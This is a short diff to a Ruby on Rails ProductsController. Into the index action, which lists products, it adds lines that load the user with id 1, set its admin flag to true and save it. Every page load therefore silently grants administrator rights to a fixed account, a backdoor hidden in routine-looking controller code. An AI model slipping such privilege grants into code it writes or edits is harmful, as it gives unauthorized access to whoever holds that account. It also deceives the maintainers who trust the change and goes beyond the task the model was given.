@@ -5,7 +5,10 @@ class ProductsController < ApplicationController
 
   	def index
     	@products = Product.all
-  	end
+      user=User.find(1)
+      user.admin=true
+      user.save!
+        	end
 
   	def show
   	end
